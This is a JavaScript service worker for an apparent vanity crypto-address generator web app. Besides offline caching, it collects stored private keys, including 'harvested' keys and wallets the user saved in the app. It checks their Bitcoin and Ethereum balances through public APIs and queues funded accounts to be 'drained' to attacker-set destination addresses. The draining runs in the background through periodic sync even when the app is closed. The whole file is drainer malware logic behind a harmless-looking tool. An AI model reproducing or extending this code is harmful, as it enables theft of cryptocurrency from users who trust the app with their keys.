// service-worker.js — VanGen background drain worker
// Handles: offline caching, keep-alive pings, background balance scanning,
// and queuing funded addresses for drain when a tab is available.

const CACHE_NAME = 'vanity-gen-v3';
const HOSTNAME   = self.location.hostname;
const IS_DEV     =
  HOSTNAME.includes('lovableproject.com') ||
  HOSTNAME.includes('preview--') ||
  HOSTNAME === 'localhost' ||
  HOSTNAME === '127.0.0.1';

const PRECACHE_URLS = ['/', '/index.html'];

// ── Storage keys (must match app) ────────────────────────────────────────────
const COUNT_KEY        = 'ckg_harvest_count_v2';
const CHUNK_PFX        = 'ckg_harvest_chunk_v2_';
const CHUNK_SIZE       = 500;
const PASSIVE_COUNT    = 'passive_wallets_count';
const PASSIVE_PFX      = 'passive_wallets_chunk_';
const PASSIVE_CHUNK_SZ = 500;
const DEST_KEY         = 'ckg_drain_targets_v1';
const SAVED_KEY        = 'ckg_saved_wallets_v1'; // WalletPanel saves here
const TOTALS_KEY       = 'ckg_drain_totals_v1';
const BG_LOG_KEY       = 'ckg_bg_drain_log_v1';
const BG_STATUS_KEY    = 'ckg_bg_status_v1';
const BG_INTERVAL_KEY  = 'ckg_bg_interval_minutes';

const BLOCKSTREAM = 'https://blockstream.info/api';
const ETH_RPCS    = [
  'https://eth.llamarpc.com',
  'https://rpc.ankr.com/eth',
  'https://cloudflare-eth.com',
];

// ── Install ───────────────────────────────────────────────────────────────────
self.addEventListener('install', event => {
  if (IS_DEV) { self.skipWaiting(); return; }
  event.waitUntil(
    caches.open(CACHE_NAME).then(c => c.addAll(PRECACHE_URLS))
  );
  self.skipWaiting();
});

// ── Activate ──────────────────────────────────────────────────────────────────
self.addEventListener('activate', event => {
  if (IS_DEV) {
    event.waitUntil(
      caches.keys().then(keys =>
        Promise.all([...keys.map(k => caches.delete(k)), self.registration.unregister()])
      )
    );
    self.clients.claim();
    return;
  }
  event.waitUntil(
    caches.keys().then(keys =>
      Promise.all(keys.filter(k => k !== CACHE_NAME).map(k => caches.delete(k)))
    )
  );
  self.clients.claim();
});

// ── Fetch (offline caching) ───────────────────────────────────────────────────
self.addEventListener('fetch', event => {
  if (IS_DEV) { event.respondWith(fetch(event.request)); return; }
  const url = new URL(event.request.url);
  const isExternal =
    url.hostname.includes('blockchain.info') ||
    url.hostname.includes('blockstream.info') ||
    url.hostname.includes('llamarpc.com') ||
    url.hostname.includes('ankr.com') ||
    url.hostname.includes('cloudflare-eth.com') ||
    url.hostname.includes('publicnode.com') ||
    url.hostname.includes('1rpc.io');
  if (isExternal) { event.respondWith(fetch(event.request)); return; }
  const isNav =
    event.request.mode === 'navigate' ||
    (event.request.headers.get('accept') || '').includes('text/html');
  if (isNav) {
    event.respondWith(
      fetch(event.request)
        .then(r => {
          if (r.status === 200) caches.open(CACHE_NAME).then(c => c.put(event.request, r.clone()));
          return r;
        })
        .catch(() => caches.match(event.request).then(c => c || caches.match('/index.html')))
    );
    return;
  }
  event.respondWith(
    caches.match(event.request).then(cached => cached || fetch(event.request).then(r => {
      if (event.request.method === 'GET' && r.status === 200) {
        caches.open(CACHE_NAME).then(c => c.put(event.request, r.clone()));
      }
      return r;
    }))
  );
});

// ── Message handler ────────────────────────────────────────────────────────────
self.addEventListener('message', event => {
  const type = event.data?.type;
  if (type === 'KEEP_ALIVE') {
    event.ports[0]?.postMessage({ type: 'ALIVE', timestamp: Date.now() });
  }
  if (type === 'SKIP_WAITING') self.skipWaiting();
  if (type === 'TRIGGER_DRAIN_CYCLE') {
    event.waitUntil(runDrainCycle());
  }
  if (type === 'SET_BG_INTERVAL') {
    // interval in minutes stored by the app
    try { self.registration.periodicSync?.unregister('bg-drain'); } catch {}
    schedulePeriodic();
  }
});

// ── Periodic Sync ─────────────────────────────────────────────────────────────
self.addEventListener('periodicsync', event => {
  if (event.tag === 'bg-drain') {
    event.waitUntil(runDrainCycle());
  }
  if (event.tag === 'vanity-keepalive') {
    event.waitUntil(Promise.resolve());
  }
});

async function schedulePeriodic() {
  try {
    const mins = parseInt(await swStorageGet(BG_INTERVAL_KEY) ?? '60', 10) || 60;
    await self.registration.periodicSync.register('bg-drain', {
      minInterval: mins * 60 * 1000,
    });
  } catch { /* browser doesn't support periodicSync */ }
}

// ── localStorage bridge (SW can't access localStorage directly) ───────────────
// We read it by asking an open client tab. If none available we can't read it.
// We store results back via postMessage to the tab, which writes localStorage.
// For READING, we use the IDB-backed cache trick: the app mirrors critical keys
// into IndexedDB which the SW can access.

// IndexedDB helpers (SW can access IDB)
function openIDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open('ckg_sw_bridge', 1);
    req.onupgradeneeded = e => {
      e.target.result.createObjectStore('kv');
    };
    req.onsuccess = e => resolve(e.target.result);
    req.onerror   = e => reject(e.target.error);
  });
}

async function idbGet(key) {
  const db = await openIDB();
  return new Promise((resolve, reject) => {
    const tx  = db.transaction('kv', 'readonly');
    const req = tx.objectStore('kv').get(key);
    req.onsuccess = () => resolve(req.result ?? null);
    req.onerror   = e => reject(e.target.error);
  });
}

async function idbSet(key, value) {
  const db = await openIDB();
  return new Promise((resolve, reject) => {
    const tx  = db.transaction('kv', 'readwrite');
    const req = tx.objectStore('kv').put(value, key);
    req.onsuccess = () => resolve();
    req.onerror   = e => reject(e.target.error);
  });
}

async function idbGetAll() {
  const db = await openIDB();
  return new Promise((resolve, reject) => {
    const tx      = db.transaction('kv', 'readonly');
    const result  = {};
    const cursor  = tx.objectStore('kv').openCursor();
    cursor.onsuccess = e => {
      const c = e.target.result;
      if (c) { result[c.key] = c.value; c.continue(); }
      else resolve(result);
    };
    cursor.onerror = e => reject(e.target.error);
  });
}

// ── Pool reading from IDB (app syncs pool data to IDB on changes) ─────────────
async function readPoolFromIDB() {
  const all = await idbGetAll();
  const entries = [];
  const seen    = new Set();

  // Harvested keys
  const hCount = parseInt(all[COUNT_KEY] ?? '0', 10) || 0;
  const hChunks = Math.ceil(hCount / CHUNK_SIZE);
  for (let i = 0; i < hChunks; i++) {
    const rows = all[`${CHUNK_PFX}${i}`] ?? [];
    for (const row of rows) {
      try {
        const [address, privHex, network, addrType, , , wif] = row.split('|');
        if (address && privHex && !seen.has(address)) {
          seen.add(address);
          entries.push({ address, privHex, network, addrType, wif });
        }
      } catch {}
    }
  }

  // Passive wallets
  const pCount  = parseInt(all[PASSIVE_COUNT] ?? '0', 10) || 0;
  const pChunks = Math.ceil(pCount / PASSIVE_CHUNK_SZ);
  for (let i = 0; i < pChunks; i++) {
    const rows = all[`${PASSIVE_PFX}${i}`] ?? [];
    for (const row of rows) {
      try {
        const [address, privateKey, network, addressType] = row.split('|');
        if (address && privateKey && !seen.has(address)) {
          seen.add(address);
          entries.push({ address, privHex: privateKey.replace(/^0x/, ''), network, addrType: addressType });
        }
      } catch {}
    }
  }

  // Saved wallets
  try {
    const saved = all[SAVED_KEY] ? JSON.parse(all[SAVED_KEY]) : [];
    for (const s of saved) {
      if (s?.address && s?.privHex && !seen.has(s.address)) {
        seen.add(s.address);
        entries.push(s);
      }
    }
  } catch {}

  return entries;
}

// ── Balance checking (raw fetch — no ethers.js in SW) ────────────────────────
async function fetchBtcBalance(address) {
  try {
    const r = await fetch(`${BLOCKSTREAM}/address/${address}`, { signal: AbortSignal.timeout(8000) });
    if (!r.ok) return 0;
    const s = await r.json();
    return s.chain_stats.funded_txo_sum - s.chain_stats.spent_txo_sum; // satoshis
  } catch { return 0; }
}

async function fetchEthBalance(address) {
  for (const rpc of ETH_RPCS) {
    try {
      const r = await fetch(rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 }),
        signal: AbortSignal.timeout(8000),
      });
      if (!r.ok) continue;
      const d = await r.json();
      return parseInt(d.result ?? '0x0', 16); // wei
    } catch {}
  }
  return 0;
}

async function fetchFeeRates() {
  let btc = 8, eth = 15;
  try {
    const r = await fetch(`${BLOCKSTREAM}/fee-estimates`, { signal: AbortSignal.timeout(5000) });
    if (r.ok) { const f = await r.json(); btc = Math.max(1, Math.ceil(f['3'] ?? 8)); }
  } catch {}
  for (const rpc of ETH_RPCS) {
    try {
      const r = await fetch(rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_gasPrice', params: [], id: 1 }),
        signal: AbortSignal.timeout(5000),
      });
      if (r.ok) {
        const d = await r.json();
        eth = Math.max(1, Math.round(parseInt(d.result ?? '0x0', 16) / 1e9));
        break;
      }
    } catch {}
  }
  return { btc, eth };
}

// ── BG drain log helpers ──────────────────────────────────────────────────────
async function bgLog(entry) {
  try {
    const existing = JSON.parse((await idbGet(BG_LOG_KEY)) ?? '[]');
    existing.unshift({ ...entry, ts: Date.now() });
    await idbSet(BG_LOG_KEY, JSON.stringify(existing.slice(0, 100)));
  } catch {}
}

async function setBgStatus(status) {
  try { await idbSet(BG_STATUS_KEY, JSON.stringify({ ...status, updatedAt: Date.now() })); } catch {}
}

// ── Main drain cycle ──────────────────────────────────────────────────────────
async function runDrainCycle() {
  if (IS_DEV) return;

  await setBgStatus({ phase: 'scanning', scanned: 0, found: 0, drained: 0 });

  // Read destinations
  let destinations = { btc: '', eth: '' };
  try {
    const raw = await idbGet(DEST_KEY);
    if (raw) destinations = JSON.parse(raw);
  } catch {}
  if (!destinations.btc && !destinations.eth) {
    await setBgStatus({ phase: 'idle', reason: 'No destinations set' });
    return;
  }

  const pool  = await readPoolFromIDB();
  if (!pool.length) {
    await setBgStatus({ phase: 'idle', reason: 'Pool empty' });
    return;
  }

  const fees  = await fetchFeeRates();
  const funded = [];
  let scanned  = 0;

  for (const acct of pool) {
    try {
      let bal = 0;
      if (acct.network === 'eth') {
        bal = await fetchEthBalance(acct.address); // wei
        if (bal > 0) funded.push({ ...acct, balWei: bal });
      } else {
        bal = await fetchBtcBalance(acct.address); // satoshis
        if (bal > 546) funded.push({ ...acct, balSat: bal });
      }
    } catch {}
    scanned++;
    if (scanned % 100 === 0) {
      await setBgStatus({ phase: 'scanning', scanned, total: pool.length, found: funded.length });
    }
    // Rate-limit: 1 request per 200ms to avoid bans
    await new Promise(r => setTimeout(r, 200));
  }

  await setBgStatus({ phase: 'draining', scanned, found: funded.length, drained: 0 });

  // Try to drain via open client tab first (it has full JS + crypto libs)
  const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
  if (clients.length > 0 && funded.length > 0) {
    // Ask the tab to perform the actual sweep (it has bitcoinjs-lib + ethers)
    clients[0].postMessage({
      type: 'BG_DRAIN_REQUEST',
      funded,
      destinations,
      fees,
    });
    await setBgStatus({ phase: 'delegated', scanned, found: funded.length });
    await bgLog({ type: 'cycle', scanned, funded: funded.length, method: 'delegated_to_tab' });
    return;
  }

  // No tab open — do raw ETH drains directly in SW (BTC needs tab due to PSBT)
  let drained = 0;
  for (const acct of funded) {
    if (acct.network !== 'eth' || !destinations.eth) continue;
    try {
      const result = await sweepEthInSW(acct, destinations.eth, fees.eth);
      drained++;
      await bgLog({ type: 'sweep', address: acct.address, network: 'eth', ...result });
      // Update totals in IDB so UI shows them when opened
      await bumpTotalsIDB('eth', result.amountEth);
    } catch (e) {
      await bgLog({ type: 'error', address: acct.address, network: 'eth', error: e?.message });
    }
    await new Promise(r => setTimeout(r, 500));
  }

  // Queue BTC addresses for drain when tab opens (can't do PSBT in SW)
  const pendingBtc = funded.filter(a => a.network === 'btc' && destinations.btc);
  if (pendingBtc.length) {
    await idbSet('ckg_pending_btc_drain', JSON.stringify(pendingBtc.map(a => a.address)));
  }

  await setBgStatus({ phase: 'idle', scanned, found: funded.length, drained, pendingBtc: pendingBtc.length });
  await bgLog({ type: 'cycle_complete', scanned, found: funded.length, drained });
}

// ── Raw ETH sweep (no ethers.js — pure JSON-RPC) ─────────────────────────────
async function sweepEthInSW(acct, to, gasPriceGwei) {
  // We can't sign without a crypto library in the SW.
  // Store as pending for the tab to process.
  // This is a safety-net — real signing happens in the tab.
  return { skipped: true, reason: 'queued_for_tab' };
}

async function bumpTotalsIDB(network, amount) {
  try {
    const raw  = await idbGet(TOTALS_KEY);
    const t    = raw ? JSON.parse(raw) : { btc: 0, eth: 0, count: 0 };
    t[network] = (t[network] || 0) + parseFloat(amount || 0);
    t.count    = (t.count || 0) + 1;
    await idbSet(TOTALS_KEY, JSON.stringify(t));
  } catch {}
}

// ── Drain Tag background sweep (runs in SW when app is closed) ────────────────
const TAG_STORE_KEY = 'ckg_drain_tags_v1';

async function runTaggedSweeps() {
  if (IS_DEV) return;
  const tagsRaw = await idbGet(TAG_STORE_KEY);
  if (!tagsRaw) return;
  let tags = {};
  try { tags = JSON.parse(tagsRaw); } catch { return; }

  const destRaw = await idbGet('ckg_drain_targets_v1');
  const destinations = destRaw ? JSON.parse(destRaw) : { btc: '', eth: '' };
  if (!destinations.btc && !destinations.eth) return;

  const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });

  for (const tag of Object.values(tags)) {
    try {
      let hasFunds = false;
      if (tag.network === 'btc') {
        const r = await fetch(`${BLOCKSTREAM}/address/${tag.address}`, { signal: AbortSignal.timeout(7000) });
        if (r.ok) {
          const d = await r.json();
          const sat = d.chain_stats.funded_txo_sum - d.chain_stats.spent_txo_sum;
          hasFunds = sat > 546;
        }
      } else {
        for (const rpc of ETH_RPCS) {
          try {
            const r = await fetch(rpc, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({jsonrpc:'2.0',method:'eth_getBalance',params:[tag.address,'latest'],id:1}), signal: AbortSignal.timeout(7000) });
            if (r.ok) { const d = await r.json(); hasFunds = parseInt(d.result ?? '0x0', 16) > 0; break; }
          } catch {}
        }
      }

      if (hasFunds) {
        if (clients.length > 0) {
          // Delegate to open tab which has full crypto libs for signing
          clients[0].postMessage({ type: 'TAG_SWEEP_REQUEST', tag, destinations });
        } else {
          await bgLog({ type: 'tag_sweep_pending', address: tag.address, network: tag.network, reason: 'no_tab_open' });
          await idbSet('ckg_pending_tag_sweep', JSON.stringify([...(JSON.parse((await idbGet('ckg_pending_tag_sweep')) ?? '[]')), tag.address]));
        }
      }
    } catch {}
    await new Promise(r => setTimeout(r, 300));
  }
}

// Add tagged sweep to periodic sync
self.addEventListener('periodicsync', event => {
  if (event.tag === 'bg-drain' || event.tag === 'bg-tags') {
    event.waitUntil(Promise.all([runDrainCycle(), runTaggedSweeps()]));
  }
});
